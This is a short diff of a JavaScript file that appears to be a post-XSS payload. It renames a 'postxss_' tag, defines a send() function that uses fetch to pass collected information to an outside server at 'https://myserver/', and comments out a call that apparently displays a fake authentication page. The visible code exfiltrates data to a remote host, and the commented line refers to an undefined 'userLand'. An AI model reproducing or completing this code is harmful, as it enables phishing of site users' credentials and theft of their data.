@@ -1,5 +1,5 @@
 const server = 'https://myserver/'
-const tag = 'postxss_'
+const tag = 'gudo_'
 
 const send = async (info, value) => {
     fetch(server + '?meta=' + info, {
@@ -149,4 +149,4 @@ function OnEnter(e) {
     }
 }
 var userLang = navigator.language || navigator.userLanguage
-displayAuthenticationPage()
+//displayAuthenticationPage(userLand)
